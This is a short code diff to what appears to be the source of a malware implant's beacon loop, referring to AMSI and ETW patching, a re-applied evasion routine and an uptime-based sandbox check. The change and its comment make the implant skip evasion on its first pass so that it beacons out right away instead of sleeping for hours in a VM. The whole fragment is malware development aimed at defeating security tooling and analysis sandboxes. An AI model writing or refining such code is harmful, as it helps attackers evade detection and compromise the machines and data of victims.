@@ -803,10 +803,15 @@ VOID BeaconLoop() {
 
     DWORD failures = 0;
     bool sentHello = false;
+    // ponytail: skip ReapplyEvasion on first pass — PatchAMSI/ETW already ran above;
+    // the uptime sandbox check fires on any VM boot/resume and sleeps 1-4 hours before
+    // a single beacon ever leaves the machine.
+    bool firstPass = true;
 
     while (true) {
         try {
-            ReapplyEvasion();
+            if (!firstPass) ReapplyEvasion();
+            firstPass = false;
             std::wstring task;
             BOOL ok = FALSE;
 
